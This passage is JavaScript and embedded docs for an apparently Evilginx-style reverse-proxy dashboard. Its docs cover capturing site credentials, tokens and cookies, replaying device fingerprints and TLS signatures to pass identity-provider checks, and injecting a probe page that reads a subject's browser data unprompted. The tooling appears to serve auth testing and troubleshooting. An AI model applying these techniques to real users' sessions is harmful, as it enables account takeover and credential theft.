  const m = flaggedErrors[0]; if(!m || m.seq==null || !m.session_id)return;
  _logSeqClick(m.session_id, m.seq);
}
function _flagBannerDismiss(){flaggedErrors.shift();_paintFlagBanner()}
function _flagBannerPrev(){if(flaggedErrors.length>1){const a=flaggedErrors.shift();flaggedErrors.push(a);_paintFlagBanner()}}
function _flagBannerDismissAll(){flaggedErrors=[];_paintFlagBanner()}

// ── Settings sub-tabs ──
function settingsSubtab(name){
  document.querySelectorAll('#panel-settings .settings-tab').forEach(b=>{
    b.classList.toggle('active', b.getAttribute('data-pane')===name);
  });
  document.querySelectorAll('#panel-settings .settings-pane').forEach(p=>{
    p.style.display=p.getAttribute('data-pane')===name?'':'none';
  });
  if(name==='integrations')renderIntegrations();
  if(name==='browser')renderBrowserConfig();
  if(name==='fingerprint')renderFingerprintConfig();
  if(name==='logging')renderLoggingConfig();
  if(name==='slack')renderSlackConfig();
  if(name==='performance')renderPerformance();
  if(name==='proxy'){renderProxyConfig();renderUpstreamHost();renderProxy();renderAuthProxy();refreshHydrateList();renderCaptureLinkList();refreshCaInfo()}
  if(name==='diagnostics')runDiagnostics();
}
function runDiagnostics(){
  const el=document.getElementById('diag-results');
  const s=document.getElementById('diag-summary');
  if(el)el.innerHTML='<div style="color:#78859b;font-size:13px">Running…</div>';
  if(s)s.textContent='';
  send({cmd:'run_diagnostics'});
}

function renderIntegrations(){
  const el=document.getElementById('integrations-cfg');if(!el)return;
  const row=(k,v,hint,opts)=>{
    const label=k.replace(/_/g,' ');
    let input;
    if(typeof v==='boolean')input=`<label class="toggle"><input type="checkbox" ${v?'checked':''} onchange="cfgSet('${k}',this.checked)"><span class="sl"></span></label>`;
    else if(typeof v==='number')input=`<input class="cfg-input" type="number" ${opts?.step?`step="${opts.step}"`:''} ${opts?.min!=null?`min="${opts.min}"`:''} ${opts?.max!=null?`max="${opts.max}"`:''} value="${v}" onchange="cfgSet('${k}',Number(this.value))">`;
    else input=`<input class="cfg-input cfg-input-wide" type="text" value="${esc(String(v||''))}" onchange="cfgSet('${k}',this.value)">`;
    return `<div class="config-row"><label>${label}</label>${input}</div>${hint?`<div style="color:#78859b;font-size:12px;margin:-4px 0 6px 0">${hint}</div>`:''}`;
  };
  const textareaRow=(k,v,hint,rows)=>{
    const label=k.replace(/_/g,' ');
    return `<div style="margin:8px 0 4px 0"><label style="font-size:13px;color:#cbd5e1">${label}</label></div>
    <textarea class="cfg-input" style="width:100%;min-height:${(rows||8)*18}px;font-family:'SF Mono','Consolas',monospace;font-size:12px;line-height:1.5;resize:vertical" onchange="cfgSet('${k}',this.value)">${esc(String(v||''))}</textarea>
    ${hint?`<div style="color:#78859b;font-size:12px;margin-top:4px">${hint}</div>`:''}`;
  };
  const c=configCache;
  el.innerHTML=`
    <h3>Flow Tracer</h3>
    <div style="color:#94a3b8;font-size:13px;margin-bottom:8px">The browser-session flow tracer captures every HTTP exchange with a 64 KB body cap and a 2000-exchange buffer per session. No runtime toggles yet — markers and taint are set per-session in the Flow Trace tab.</div>

    <h3>RAG Scan Stack</h3>
    <div style="color:#94a3b8;font-size:13px;margin-bottom:8px">When enabled, the "Send to RAG" button on Flow Trace POSTs the captured flow as a <code style="background:#1a1a2e;color:#fbbf24;padding:1px 4px;border-radius:3px">trace_flow_for_&lt;host&gt;</code> finding to an <em>external</em> RAG Scan Stack at the URL below. (This container already exposes its own RAG API on :8000 for Burp — the settings here are only for pushing to a <em>different</em> RAG instance.)</div>
    ${row('rag_enabled', c.rag_enabled)}
    ${row('rag_api_url', c.rag_api_url, 'e.g. https://rag.example.com')}
    ${row('rag_api_key', c.rag_api_key, 'Sent as <code>x-api-key</code> header')}
    ${row('rag_engagement_id', c.rag_engagement_id, 'Optional UUID of the RAG engagement to attach findings to')}

    <h4 style="margin-top:14px;color:#cbd5e1;font-size:13px">Burp Suite</h4>
    <div style="color:#94a3b8;font-size:13px;margin-bottom:8px"><code>burp-extension/RagScanBridge.py</code> is a Burp Extender (Jython) extension that syncs findings with the built-in RAG API on :8000 — no external RAG Scan Stack needed. Burp Suite -&gt; Extender -&gt; Add -&gt; Extension Type: Python, then select the downloaded file.</div>
    <div style="margin:8px 0">
      <a class="btn" style="padding:4px 12px;font-size:13px;text-decoration:none;display:inline-block" href="/api/rag/burp-extension/download" download="RagScanBridge.py">Download Burp extension</a>
    </div>

    <h3>Ollama Analysis</h3>
    <div style="color:#94a3b8;font-size:13px;margin-bottom:8px">When enabled, the "Analyze (Ollama)" button sends a compact flow summary plus the system prompt below to the configured Ollama server.</div>
    ${row('ollama_enabled', c.ollama_enabled)}
    ${row('ollama_url', c.ollama_url, 'Reaches your Ollama instance. Local install: <code>http://127.0.0.1:11434</code>. From inside Docker: <code>http://host.docker.internal:11434</code>. See the <b>Docs</b> tab → <i>SSH port forwarding</i> for tunneling a remote stack back to laptop Ollama.')}
    <div class="config-row">
      <label>ollama model</label>
      <input id="ollama-model-input" class="cfg-input cfg-input-wide" type="text" list="ollama-models-datalist" value="${esc(String(c.ollama_model||''))}" onchange="cfgSet('ollama_model',this.value);renderOllamaModelChips()">
      <datalist id="ollama-models-datalist">${ollamaModels.map(m=>`<option value="${esc(m)}">`).join('')}</datalist>
    </div>
    <div style="color:#78859b;font-size:12px;margin:-4px 0 6px 0">Type a model name, pick from the datalist, or click a chip below. <b>List models</b> fetches what's currently pulled on the Ollama server.</div>
    <div style="margin:8px 0;display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <button class="btn" style="padding:4px 12px;font-size:13px" onclick="testOllama()">Test connection &amp; list models</button>
      <span id="ollama-status-dot" title="Not tested" style="display:inline-block;width:12px;height:12px;border-radius:50%;background:#555;border:1px solid #222;box-shadow:0 0 0 2px #111128"></span>
      <span id="ollama-test-result" style="font-size:13px"></span>
    </div>
    <div id="ollama-model-chips" style="margin-top:6px;display:flex;flex-wrap:wrap;gap:4px"></div>

    <h3 style="margin-top:20px">Sampling Parameters <span style="color:#78859b;font-weight:400;font-size:12px;text-transform:none;letter-spacing:normal">— tuned for factual, deterministic output</span></h3>
    ${row('ollama_temperature', c.ollama_temperature, 'Lower = more deterministic. <code>0.0</code>–<code>0.2</code> recommended for factual analysis. Default: 0.1', {step:0.05, min:0, max:2})}
    ${row('ollama_top_p', c.ollama_top_p, 'Nucleus sampling. With low temperature this has minor effect; <code>0.3</code>–<code>0.5</code> is a safe range. Default: 0.3', {step:0.05, min:0, max:1})}
    ${row('ollama_top_k', c.ollama_top_k, 'Restrict to top K tokens. Lower = more focused. Default: 20', {step:1, min:1, max:100})}
    ${row('ollama_num_ctx', c.ollama_num_ctx, 'Context window. Must fit system prompt + flow data + response. Default: 8192 (llama3.1 supports 131072 if you have the RAM).', {step:1024, min:2048})}
    ${row('ollama_num_predict', c.ollama_num_predict, 'Max tokens to generate. Default <code>512</code> caps analysis length so it cannot run away. <code>-1</code> = unlimited (model stops at EOS) — the old default that, with no streaming, made the UI block for the whole generation.', {step:128, min:-1})}
    ${row('ollama_keep_alive', c.ollama_keep_alive, 'How long Ollama keeps the model resident after a request (e.g. <code>30m</code>, <code>-1</code> = forever, <code>0</code> = unload immediately). Avoids the multi-second cold reload between analyses.')}
    ${row('ollama_think', c.ollama_think, 'Thinking/reasoning models (gemma4, qwen3) emit chain-of-thought before the answer. Off = answer directly (recommended for analysis — faster, and stops the num_predict cap from being spent on hidden reasoning, which returns empty). On = keep reasoning. Auto-ignored for models that do not support it.')}
    ${row('ollama_seed', c.ollama_seed, 'Non-zero value = reproducible output (same seed + same prompt → same answer). <code>0</code> = random.', {step:1, min:0})}

    <h3 style="margin-top:20px">System Prompt — general</h3>
    <div style="color:#94a3b8;font-size:13px;margin-bottom:4px">The default is tuned to keep the model grounded in the captured data and to cite seq numbers for every claim. Removing the "do not invent / not observable from capture" instructions will increase hallucination risk.</div>
    ${textareaRow('ollama_system_prompt', c.ollama_system_prompt, '', 14)}

    <h3 style="margin-top:20px">Preset-specific prompts</h3>
    <div style="color:#94a3b8;font-size:13px;margin-bottom:4px">Leave blank to use the built-in protocol-specific prompt shipped in <code>backend/ollama_hook.py._PRESET_PROMPTS</code>. Provide an override only if you need to reshape the schema for that preset.</div>
    ${textareaRow('ollama_system_prompt_sso', c.ollama_system_prompt_sso, 'Applied when preset=sso. Empty = use the bundled SSO schema (Protocol / Roles / Stages / Identity assertion / Session binding / Anomalies).', 8)}
    ${textareaRow('ollama_system_prompt_saml', c.ollama_system_prompt_saml, 'Applied when preset=saml. Empty = use the bundled SAML schema (Binding / SAMLRequest / SAMLResponse / Assertion fields / RelayState / Signature / Anomalies).', 8)}
    ${textareaRow('ollama_system_prompt_oidc', c.ollama_system_prompt_oidc, 'Applied when preset=oidc. Empty = use the bundled OIDC/OAuth2 schema (Grant type / Authorize / Callback / Token exchange / id_token claims / Refresh / Session binding / Anomalies).', 8)}
    ${textareaRow('ollama_system_prompt_troubleshoot', c.ollama_system_prompt_troubleshoot, 'Applied when preset=troubleshoot. Empty = use the bundled troubleshoot schema (Outcome / Last-good seq / Breaking seq / Evidence / Hypotheses / Next check).', 8)}

    <div style="margin-top:14px;display:flex;gap:8px">
      <button class="btn" onclick="saveConfig()">Apply</button>
      <button class="btn" style="border-color:#78859b;color:#94a3b8" onclick="resetOllamaPrompt()">Reset prompt to default</button>
    </div>
  `;
  renderOllamaModelChips();
}
const _OLLAMA_DEFAULT_PROMPT=`You are a web-application security analyst reviewing captured HTTP exchanges. You analyze ONLY the data shown in the user message. You MUST NOT:
- invent URLs, headers, tokens, parameters, or values that are not in the captured data
- speculate about parts of the flow that were not captured
- draw on external knowledge about specific sites or APIs — use only what the capture shows

Every factual claim must cite the supporting seq number(s) in the form #N. If something cannot be determined from the captured data, write "not observable from capture" and move on.

Produce markdown with exactly these sections:
1. **Flow summary** — 2-3 sentences identifying the auth protocol used. Only mention what is evidenced.
2. **Key steps** — numbered list of the critical exchanges, each with its #seq number and what it accomplishes.
3. **Credentials & tokens** — which exchanges posted credentials, which returned tokens/cookies, and how values propagate across requests. Cite seq numbers. Never emit token/cookie values.
4. **Parameters of interest** — auth-related param names present (state, code, nonce, PKCE, CSRF, session cookies, bearer tokens). Names and seq numbers only, never values.
5. **Notes** — anomalies observable in the data (missing PKCE where expected, credentials appearing in URLs, unusual redirect targets). Cite seq numbers. If nothing anomalous, state that.

Do not add sections. Do not speculate. Do not summarize beyond the data.`;
function resetOllamaPrompt(){configCache.ollama_system_prompt=_OLLAMA_DEFAULT_PROMPT;renderIntegrations()}

// ── Hydrate Playwright session from proxy capture ──
let capturedHosts=[];
function refreshHydrateList(){
  send({cmd:'list_captured_proxy'});
  const sel=document.getElementById('hydrate-sid-select');
  if(sel){
    const sids=Object.keys(knownSessions);
    sel.innerHTML=sids.length?sids.map(sid=>{
      const short=sessionLabel(sid);
      return `<option value="${sid}">${esc(short)} — ${sid.slice(-10)}</option>`;
    }).join(''):`<option value="">(no active sessions — open one on :8091)</option>`;
  }
}
function renderHydrateHostList(){
  const sel=document.getElementById('hydrate-host-select');if(!sel)return;
  if(!capturedHosts.length){sel.innerHTML=`<option value="">(nothing captured yet — browse through localhost:3128)</option>`;return}
  sel.innerHTML=capturedHosts.map(h=>{
    const when=h.captured_at?new Date(h.captured_at*1000).toLocaleTimeString():'';
    const fp=h.fingerprint||{};
    // Captured fingerprint summary — family tag (chromium / firefox /
    // webkit, or chromium-msedge for Edge UAs) + client-hint count.
    // Shows analysts whether a JA3-matching launch is possible without
    // digging into logs.
    const fpTag=fp.family?` · fp=${fp.family}${fp.hints?'/'+fp.hints+'h':''}`:'';
    return `<option value="${esc(h.hostname)}" title="${fp.ua?esc(fp.ua):''}">${esc(h.hostname)} · ${h.cookies} cookies, ${h.headers} headers${fpTag} · ${when}</option>`;
  }).join('');
}
function hydrateSession(){
  const host=document.getElementById('hydrate-host-select').value;
  const sid=document.getElementById('hydrate-sid-select').value;
  const nav=document.getElementById('hydrate-navigate').checked;
  const el=document.getElementById('hydrate-result');
  if(!host){if(el)el.innerHTML='<span style="color:#fbbf24">Pick a captured host</span>';return}
  if(!sid){if(el)el.innerHTML='<span style="color:#fbbf24">Pick a session</span>';return}
  if(el)el.innerHTML='<span style="color:#94a3b8">Hydrating…</span>';
  send({cmd:'hydrate_session',session_id:sid,hostname:host,navigate:nav});
}
function testOllama(){
  const el=document.getElementById('ollama-test-result');
  if(el){el.textContent='Testing…';el.style.color='#94a3b8'}
  setOllamaStatus('pending','Testing…');
  // Save current config first so the test uses latest values
  send({cmd:'update_config',data:configCache});
  send({cmd:'test_ollama'});
}
function setOllamaStatus(state,title){
  const d=document.getElementById('ollama-status-dot');if(!d)return;
  const colors={pending:'#fbbf24',ok:'#22c55e',warn:'#fbbf24',err:'#ef4444',unknown:'#555'};
  d.style.background=colors[state]||colors.unknown;
  d.title=title||state;
}
function pickOllamaModel(name){
  configCache.ollama_model=name;
  const input=document.getElementById('ollama-model-input');
  if(input)input.value=name;
  renderOllamaModelChips();
}
function renderOllamaModelChips(){
  const el=document.getElementById('ollama-model-chips');if(!el)return;
  if(!ollamaModels.length){el.innerHTML='<span style="color:#78859b;font-size:12px">No models fetched yet. Click <b>Test connection &amp; list models</b>.</span>';return}
  const current=configCache.ollama_model||'';
  el.innerHTML=ollamaModels.map(m=>{
    const active=m===current||m.startsWith(current+':');
    const style=active?'border-color:#3b82f6;color:#7dd3fc;background:#1e293b':'';
    return `<button class="preset-btn" style="${style}" onclick="pickOllamaModel('${esc(m).replace(/'/g,"\\'")}')">${esc(m)}</button>`;
  }).join('');
}

// ── Docs ──
function renderDocs(){
  const host=location.hostname||'localhost';
  const html=`
  <style>
    #docs-content h2{color:#7dd3fc;margin-top:24px;margin-bottom:8px;font-size:18px;border-bottom:1px solid #333;padding-bottom:4px}
    #docs-content h3{color:#a5b4fc;margin-top:16px;margin-bottom:6px;font-size:15px}
    #docs-content p{color:#cbd5e1;line-height:1.6;margin:6px 0}
    #docs-content ul,#docs-content ol{color:#cbd5e1;line-height:1.7;margin:6px 0 6px 20px}
    #docs-content code{background:#1a1a2e;color:#fbbf24;padding:1px 6px;border-radius:3px;font-size:12px}
    #docs-content pre{background:#05050e;border:1px solid #222;border-radius:4px;padding:10px 12px;font-size:12px;color:#cbd5e1;overflow-x:auto;margin:6px 0}
    #docs-content table{border-collapse:collapse;margin:8px 0;font-size:13px}
    #docs-content th,#docs-content td{border:1px solid #333;padding:4px 10px;text-align:left;color:#cbd5e1}
    #docs-content th{background:#0d0d20;color:#94a3b8}
    #docs-content .hint{background:#0a0a18;border-left:3px solid #3b82f6;padding:8px 14px;margin:8px 0;color:#94a3b8;font-size:13px}
    #docs-content .attack-card{border:1px solid #222;border-radius:6px;padding:12px 16px;margin:12px 0;background:#0d1117}
    #docs-content .attack-card h3{margin-top:0}
    #docs-content .attack-card h3 a{color:#7dd3fc;text-decoration:none;border-bottom:1px dashed #33506b}
    #docs-content .attack-card h3 a:hover{color:#a5d6ff;border-bottom-color:#7dd3fc}
    #docs-content .attack-card h3 .portal-arrow{font-size:12px;color:#6e7681;font-weight:normal;margin-left:6px}
    #docs-content .attack-goal{color:#78859b;font-size:12px;margin:0 0 8px 0;font-style:italic}
    .docs-subtab-bar{display:flex;gap:6px;margin-bottom:16px;border-bottom:1px solid #222;padding-bottom:10px}
    .docs-subtab-btn{background:#12141f;border:1px solid #2a2f3d;color:#94a3b8;padding:6px 14px;border-radius:4px;font-size:13px;cursor:pointer}
    .docs-subtab-btn.active{background:#0ea5e91a;border-color:#0ea5e9;color:#7dd3fc}
  </style>

  <div class="docs-subtab-bar">
    <button class="docs-subtab-btn active" data-docs-pane="reference" onclick="switchDocsPane('reference')">Reference</button>
    <button class="docs-subtab-btn" data-docs-pane="attacks" onclick="switchDocsPane('attacks')">Test Attacks</button>
  </div>

  <div id="docs-pane-reference">

  <p style="color:#94a3b8">Remote browser login capture + auth proxy + flow tracer. Everything runs in this one container.</p>

  <h2>Ports</h2>
  <table>
    <tr><th>Port</th><th>Purpose</th><th>Open in browser</th></tr>
    <tr><td><code>8091</code></td><td>Main app — browser session UI</td><td><a href="http://${host}:8091/" target="_blank" style="color:#7dd3fc">http://${host}:8091/</a></td></tr>
    <tr><td><code>8092</code></td><td>Debug dashboard (you are here)</td><td>—</td></tr>
    <tr><td><code>8000</code></td><td>RAG API (Burp extension target)</td><td><a href="http://${host}:8000/health" target="_blank" style="color:#7dd3fc">http://${host}:8000/health</a></td></tr>
    <tr><td><code>8085</code></td><td>Reverse proxy (transparent BITM, Evilginx-style)</td><td><a href="http://${host}:8085/" target="_blank" style="color:#7dd3fc">http://${host}:8085/</a></td></tr>
    <tr><td><code>3100-3199</code></td><td>Published range for auth proxy (default <b>3128</b>) — any port in this range is reachable on your host. <b>Click Start on the Proxy tab</b> to enable.</td><td>—</td></tr>
    <tr><td><code>3129</code></td><td>Built-in test proxy (default — any of 3100-3199 works)</td><td>—</td></tr>
  </table>

  <h2>Tabs in this dashboard</h2>
  <ul>
    <li><b>All Logs</b> — every event across every subsystem (browser session, auth proxy, devices, keepalive, etc.)</li>
    <li><b>Sessions</b> (dropdown) — per-session log views. Pick from the dropdown; × closes the session.</li>
    <li><b>Saved Sessions</b> — saved login URL presets.</li>
    <li><b>Captured Data</b> — aggregated credentials (tokens, cookies, headers, localStorage) per site.</li>
    <li><b>Devices</b> — reusable device profiles (fingerprint + optional probed JS signals + optional creds). See <i>Device fingerprinting &amp; profiles</i> below.</li>
    <li><b>Keep-Alive</b> — token-validity monitoring log.</li>
    <li><b>Proxy</b> — start/stop the auth proxy and test proxy, configure upstream.</li>
    <li><b>Proxy Traffic</b> — live traffic flowing through the auth proxy (<code>INJECT</code>, <code>BITM_INJECT</code>, <code>TUNNEL</code>, etc.).</li>
    <li><b>Flow Trace</b> — timeline of every HTTP exchange in a browser session, with taint highlighting and auth-milestone banner pills (LOGIN → AUTH CODE → TOKENS → SESSION → PRT). See <i>Auth-flow milestones</i> below.</li>
    <li><b>Index</b> — aggregated cross-row index of headers, cookies, bearer tokens, and <b>Decoded JWTs</b> (claims surfaced inline — no signature verification). Click an item to highlight it across the Flow Trace.</li>
  </ul>

  <h2>Flow Trace</h2>
  <ol>
    <li>Start a session in the <a href="http://${host}:8091/" target="_blank" style="color:#7dd3fc">main app</a>.</li>
    <li>Open the <b>Flow Trace</b> tab, pick the session from the dropdown.</li>
    <li>Click any row to see request headers, request body, response headers, response body.</li>
    <li>Use the <b>Tracked values</b> sidebar to highlight every row containing a chosen string (email, state, code, session cookie name, etc.).</li>
    <li>The <b>Detected</b> section auto-suggests interesting values it found in the flow (OAuth <code>state</code>, <code>code</code>, cookie names). Click one to track it.</li>
  </ol>

  <div class="hint">Response bodies are capped at 64 KB; image/font/CSS/JS responses are skipped. Per-session buffer is 2000 exchanges max.</div>

  <h2>Auth-flow milestones (Flow Trace banners)</h2>
  <p>Every flow row is auto-classified against an OAuth/OIDC heuristic and tagged with one or more colour-coded pills next to the URL. Same pills also surface in the Index → Decoded JWTs counts.</p>
  <table>
    <tr><th>Pill</th><th>What it means</th><th>How it's detected</th></tr>
    <tr><td><span class="flow-ms-badge login" style="padding:1px 6px">LOGIN</span></td><td>IdP-rendered username / password / MFA / KMSI / consent step.</td><td>URL host matches <code>idp_hosts</code> + path matches <code>login_path_patterns</code>; OR request/response body contains a marker (<code>flowToken</code>, <code>canary</code>, Okta <code>stateHandle</code>).</td></tr>
    <tr><td><span class="flow-ms-badge code" style="padding:1px 6px">AUTH CODE</span></td><td>The IdP redirect-back to the relying party carrying the authorization code.</td><td>Response <code>Location:</code> header contains <code>?code=…</code> AND <code>state=</code>/<code>session_state=</code>/<code>client_info=</code>. Code value is <b>masked</b> (<code>code=&lt;redacted&gt;</code>) before storage.</td></tr>
    <tr><td><span class="flow-ms-badge tokens" style="padding:1px 6px">TOKENS</span></td><td>Token endpoint issued an <code>access_token</code> / <code>id_token</code> / <code>refresh_token</code>.</td><td>POST to a <code>token_path_patterns</code> URL, 2xx, with <code>grant_type=authorization_code</code> (or <code>client_credentials</code>, <code>device_code</code>, <code>password</code>, <code>implicit</code>).</td></tr>
    <tr><td><span class="flow-ms-badge refresh" style="padding:1px 6px">REFRESH</span></td><td>Token rotation.</td><td>POST to token endpoint with <code>grant_type=refresh_token</code>.</td></tr>
    <tr><td><span class="flow-ms-badge prt" style="padding:1px 6px">PRT</span></td><td>Primary Refresh Token (AAD device-bound).</td><td>POST to token endpoint with <code>grant_type=srv_challenge</code> or <code>urn:ietf:params:oauth:grant-type:jwt-bearer</code>; OR scope contains <code>aza</code>/<code>openid_aza</code>; OR response <code>token_type</code> is <code>pop</code>/<code>bearer-prt</code>; OR Set-Cookie name starts with <code>x-ms-</code>.</td></tr>
    <tr><td><span class="flow-ms-badge session" style="padding:1px 6px">SESSION</span></td><td>Browser-persistence session cookie set by the IdP/RP.</td><td>Set-Cookie name in <code>session_cookie_names</code> (<code>ESTSAUTH</code>, <code>ESTSAUTHPERSISTENT</code>, <code>MSPAuth</code>, <code>idsrvAuth</code>, etc.) or starts with a <code>session_cookie_prefixes</code> entry.</td></tr>
    <tr><td><span class="flow-ms-badge bearer" style="padding:1px 6px">BEARER</span></td><td>Token-in-use marker — any request carrying <code>Authorization: Bearer &lt;jwt&gt;</code>. Catches authenticated requests even when the issuance happened off-flow (cached cookies, hydrated session). Token value is masked in the detail; <code>aud</code>/<code>scp</code> claims are decoded inline (no signature check).</td><td>Request <code>Authorization</code> header parses as <code>Bearer &lt;jwt-shape&gt;</code>.</td></tr>
    <tr><td><span class="flow-ms-badge ca_blocked" style="padding:1px 6px">CA-BLOCKED</span></td><td>Conditional Access policy blocked the sign-in. Detail line carries the parsed URL params (Reason, Policy, client-request-id, deviceId, etc.) when AAD redirected to the user-facing block page, or the <code>AADSTS5300x</code> code when the failure surfaced as an error code on the response body / Location header.</td><td>URL or <code>Location:</code> matches <code>globals.ca_milestones.blocked_url_patterns</code> (default: <code>aka.ms/conditionalaccess</code>); OR response body / URL / Location contains a code in <code>globals.ca_milestones.aadsts_codes</code>.</td></tr>
    <tr><td><span class="flow-ms-badge ca_reprocess" style="padding:1px 6px">CA-REPROCESS</span></td><td>AAD claim challenge — re-evaluating Conditional Access policy mid-flow (often runs in an iframe or redirect chain that doesn't change the top-level URL). Frequently followed by either TOKENS (policy satisfied) or CA-BLOCKED / RP-REJECT (policy not satisfied).</td><td>URL or <code>Location:</code> matches <code>globals.ca_milestones.reprocess_url_patterns</code> (default: <code>/common/reprocess</code>).</td></tr>
    <tr><td><span class="flow-ms-badge rp_reject" style="padding:1px 6px">RP-REJECT</span></td><td>The relying party rejected an AAD-issued token at its callback endpoint. Common shape when AAD vouched but the RP itself enforced an additional check (CA claim missing, audience mismatch, license expired). Distinct from CA-BLOCKED — that's an AAD-side decision, this is an RP-side decision after AAD said yes.</td><td>4xx/5xx response on a URL whose path matches <code>globals.rp_callbacks.url_patterns</code> (e.g. <code>/signin-oidc</code>, <code>/saml/acs</code>) AND host is <i>not</i> in <code>auth_milestones.idp_hosts</code>.</td></tr>
    <tr><td><span class="flow-ms-badge mdm_discover" style="padding:1px 6px">MDM-DISCOVER</span></td><td>Intune MDM discovery — client asks "where do I enroll?" Always precedes MDM-ENROLL on a fresh enrollment. Visibility-only: this proxy does not synthesize or replay MDM traffic.</td><td>Request URL host matches <code>globals.mdm_milestones.hosts</code> AND path matches a <code>discover_url_patterns</code> entry (default: <code>/EnrollmentServer/Discovery</code>).</td></tr>
    <tr><td><span class="flow-ms-badge mdm_enroll" style="padding:1px 6px">MDM-ENROLL</span></td><td>Intune MDM enrollment exchange — device gets its MDM cert and initial policy set. Followed by periodic MDM-CHECKIN.</td><td>Host in <code>globals.mdm_milestones.hosts</code> AND path matches an <code>enroll_url_patterns</code> entry (default: <code>/EnrollmentServer/Enrollment</code>, <code>/EnrollmentServer/Policy</code>).</td></tr>
    <tr><td><span class="flow-ms-badge mdm_checkin" style="padding:1px 6px">MDM-CHECKIN</span></td><td>Intune SyncML / OMA-DM check-in — the device reports posture and Intune evaluates compliance policies. The compliance verdict (<code>isCompliant: true/false</code>) propagates into AAD device records out-of-band and is <b>not</b> directly visible in this body — look at the next id_token's <code>deviceid</code> claim for what AAD ended up believing.</td><td>Host in <code>globals.mdm_milestones.hosts</code> AND path matches a <code>checkin_url_patterns</code> entry (default: <code>/dmserver</code>, <code>/manage.svc</code>, <code>/SyncML</code>).</td></tr>
  </table>
  <p>All recognition rules live in <code>config/sites.yaml</code> under the <code>auth_milestones:</code> block and deep-merge with <code>$DATA_DIR/sites.yaml</code>. Adding a custom on-prem ADFS or Keycloak is a YAML edit, not a code change — the regex bundles compile once on YAML hot-reload (mtime-checked, ~1 s) and cache against the merged-rules dict identity. Full guide: <code>docs/AUTH_FLOWS.md</code> in the repo.</p>
  <h3>Reclassify milestones</h3>
  <p>The Flow Trace toolbar's <b>Reclassify milestones</b> button forces a fresh <code>classify()</code> pass over every row of the selected session. Useful after editing <code>config/sites.yaml</code> or to backfill rows captured before the classifier shipped.</p>
  <p>The result lands as a banner directly above the timeline:</p>
  <ul>
    <li><b>tagged N / M rows</b> + per-kind pill counts.</li>
    <li><b>Hit counts:</b> <code>req_body</code> / <code>resp_body</code> / <code>token_paths</code> / <code>idp_hosts</code> — diagnose which condition the rows are missing.</li>
    <li><b>YAML status:</b> green (<code>YAML loaded (N idp_hosts, M session cookies)</code>) or red (<code>YAML problem — idp_hosts=0, login_re=NO, token_re=NO</code>).</li>
    <li>Expandable <b>untagged token-path rows</b> dump up to 3 samples with their request/response body previews so you can read why on the spot.</li>
  </ul>
  <p>Same line is also <code>print()</code>'d to stdout with a <code>[FLOW]</code> prefix — visible via <code>journalctl -u bitm-proxy -f</code>, <code>docker logs -f</code>, or the <code>run-local.sh</code> console.</p>

  <h2>Device fingerprinting &amp; profiles</h2>
  <p>The BITM proxy on <code>:3128</code> passively captures the connecting browser's device fingerprint on every request — User-Agent, the full Sec-CH-UA-* client-hint set (<code>sec-ch-ua</code>, <code>sec-ch-ua-mobile</code>, <code>sec-ch-ua-platform</code>, <code>-platform-version</code>, <code>-arch</code>, <code>-bitness</code>, <code>-model</code>, <code>-full-version-list</code>, etc.), and Accept-Language. It's stored per-host under <code>_captured_sessions[hostname]['fingerprint']</code> in <code>backend/auth_proxy.py</code> and surfaces in the <b>Captures</b> dropdown with a family tag (<code>chromium-msedge</code>, <code>webkit</code>, <code>firefox</code>) and a hint count.</p>

  <h3>Two ways to use the fingerprint</h3>
  <table>
    <tr><th>Setting</th><th>Effect</th></tr>
    <tr><td><code>use_captured_fingerprint</code></td><td>When Playwright launches at <code>:8091</code>, replay the captured UA + Sec-CH-UA-* hints + Accept-Language so the IdP sees the same browser signature it already trusts.</td></tr>
    <tr><td><code>fingerprint_match_engine</code> <span style="color:#78859b">(sub-knob)</span></td><td>If the captured UA classifies as Firefox or Safari, launch <code>firefox</code>/<code>webkit</code> instead of Chromium so the JA3 matches the UA family.</td></tr>
    <tr><td><code>fingerprint_match_tls_proxy</code> <span style="color:#78859b">(sub-knob)</span></td><td>The auth proxy's <i>upstream</i> leg uses <code>curl_cffi</code> impersonation (<code>chrome124</code> / <code>edge101</code> / <code>firefox133</code> / <code>safari17_0</code>) so origins see a real-browser-shape Client Hello (JA3/JA4) instead of OpenSSL's. WebSocket upgrades and &gt;50 MB bodies bypass this path.</td></tr>
    <tr><td><code>device_probe_enabled</code></td><td>Allows the active JS-probe page to be served when a Devices registration with <i>Active probe</i> is pending. Default on; set false to keep registrations passive-only.</td></tr>
  </table>

  <h3>Devices tab — reusable profiles</h3>
  <p>A device profile is a snapshotted, named bundle of fingerprint + (optional) probed JS signals + (optional) per-host credentials that fresh Playwright sessions can be launched against. Where <i>hydrate</i> injects the latest in-memory capture into a live session, a profile is the persistent named version that you can re-use months later.</p>
  <p>What a profile holds:</p>
  <ul>
    <li><b>Fingerprint:</b> User-Agent + Sec-CH-UA-* + Accept-Language</li>
    <li><b>Engine family + channel:</b> <code>chromium</code> / <code>chromium-msedge</code> / <code>firefox</code> / <code>webkit</code> — derived from UA</li>
    <li><b>Impersonate tag:</b> the <code>curl_cffi</code> target used by the upstream-impersonation path</li>
    <li><b>Viewport / DPR / mobile / has_touch / locale / timezone</b></li>
    <li><b>Probed signals</b> (when active probe ran): timezone, screen, viewport, navigator.languages/platform/hardwareConcurrency/deviceMemory</li>
    <li><b>Per-host credentials</b> (when "include cookies + storage" is on): cookies, Authorization/CSRF headers, localStorage, sessionStorage</li>
  </ul>
  <p>On disk: <code>$DATA_DIR/devices/&lt;dev_id&gt;.{json,enc}</code> via the same <code>JsonStore</code> used by credentials/cookies — encrypted at rest when <code>CREDENTIAL_PASSPHRASE</code> is set.</p>

  <h3>Three ways to register</h3>
  <ol>
    <li><b>Register from capture…</b> (Devices tab toolbar) — pick a host you've already browsed through <code>:3128</code>. Modes:
      <ul>
        <li><b>Passive</b> — snapshot of <code>_captured_sessions[host]</code> right now. No prompt to the subject.</li>
        <li><b>Active JS probe</b> — also stamps a one-shot <code>_pending_probes[host]</code> entry. The next GET that flows through <code>:3128</code> to that host gets a <b>synthetic 200 OK</b> from the proxy that runs JS to read tz/screen/viewport/languages/platform, POSTs the result to a sentinel path on the same host (<code>/__bitm_probe_callback</code> — consumed in-proxy, never reaches upstream), and meta-refreshes to the original URL. Single-fire, 30-min TTL.</li>
        <li><b>Probe + cred snapshot</b> — same as Active probe, plus the probe page also serializes <code>localStorage</code> / <code>sessionStorage</code> into the POST body.</li>
      </ul>
    </li>
